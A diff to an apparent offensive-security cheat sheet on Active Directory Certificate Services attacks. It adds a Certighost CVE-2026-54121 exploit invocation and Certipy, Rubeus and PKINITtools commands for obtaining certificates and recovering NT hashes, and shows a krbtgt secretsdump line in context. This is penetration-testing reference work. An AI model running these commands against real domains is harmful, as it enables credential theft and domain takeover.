@@ -84,6 +84,25 @@ Active Directory Certificate Services (AD CS) is a Microsoft Windows server role
   secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 
   ```
 
+## Certighost CVE-2026-54121
+
+Patched in July 2026 update.
+
+Certighost is a vulnerability in certificate enrollment where a Certification Authority trusts a requester-controlled directory lookup target. By supplying the **cdc** and **rmd** attributes, an attacker can redirect the CA to a rogue host running SMB, LDAP, and LSA services.
+
+* `cdc` (Client DC), which identifies the host the CA should contact
+* `rmd` (Remote Domain), which identifies the principal the CA should look up
+
+The attacker-controlled server can return forged directory information for a chosen Domain Controller, such as its SID and DNS hostname. The CA then embeds this identity data into the issued certificate, allowing the attacker to impersonate the Domain Controller during certificate-based authentication and potentially gain replication privileges.
+
+A standard domain machine account is sufficient to pass the CA's initial authentication checks, meaning the rogue lookup server does not need to be the Domain Controller it claims to represent.
+
+* [aniqfakhrul/CVE-2026-54121](https://github.com/aniqfakhrul/CVE-2026-54121)
+
+  ```ps1
+  sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
+  ```
+
 ## Pass-The-Certificate
 
 > Pass the Certificate in order to get a TGT, this technique is used in "UnPAC the Hash" and "Shadow Credential"
@@ -167,31 +186,39 @@ There is still a way to use the certificate to takeover the account.
 
 Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User via its certificate.
 
-* Windows
+* [ly4k/Certipy](https://github.com/ly4k/Certipy)
 
-    ```ps1
-    # Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.
-    Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
-    ```
+  ```ps1
+  export KRB5CCNAME=/pwd/to/user.ccache
+  proxychains certipy req -username "user@domain.lab" -ca "domain-DC-CA" -target "dc1.domain.lab" -template User -k -no-pass -dns-tcp -ns 10.10.10.10 -dc-ip 10.10.10.10
+  proxychains certipy auth -pfx 'user.pfx' -dc-ip 10.10.10.10 -username user -domain domain.lab
+  ```
 
-* Linux
+* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
 
-    ```ps1
-    # Obtain a TGT by validating a PKINIT pre-authentication
-    $ gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
-    
-    # Use the session key to recover the NT hash
-    $ export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
-    ```
+  ```ps1
+  # Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.
+  Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
+  ```
+
+* [dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)
+
+  ```ps1
+  # Obtain a TGT by validating a PKINIT pre-authentication
+  gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
+  
+  # Use the session key to recover the NT hash
+  export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
+  ```
 
 ## Common Error Messages
 
-| Error Name | Description |
-| ---------- | ----------- |
-| `CERTSRV_E_TEMPLATE_DENIED` | The permissions on the certificate template do not allow the current user to enroll |
-| `KDC_ERR_INCONSISTENT_KEY_PURPOSE` | Certificate cannot be used for PKINIT client authentication |
-| `KDC_ERROR_CLIENT_NOT_TRUSTED` | Reserved for PKINIT. Try to authenticate to another DC |
-| `KDC_ERR_PADATA_TYPE_NOSUPP` | KDC has no support for padata type. CA might be expired |
+| Error Name                         | Description                                                                         |
+| ---------------------------------- | ----------------------------------------------------------------------------------- |
+| `CERTSRV_E_TEMPLATE_DENIED`        | The permissions on the certificate template do not allow the current user to enroll |
+| `KDC_ERR_INCONSISTENT_KEY_PURPOSE` | Certificate cannot be used for PKINIT client authentication                         |
+| `KDC_ERROR_CLIENT_NOT_TRUSTED`     | Reserved for PKINIT. Try to authenticate to another DC                              |
+| `KDC_ERR_PADATA_TYPE_NOSUPP`       | KDC has no support for padata type. CA might be expired                             |
 
 `KDC_ERR_PADATA_TYPE_NOSUPP` error still allow the attacker to use the certificate with the Pass-The-Cert. Since the DC's LDAPS service only check the SAN.
 
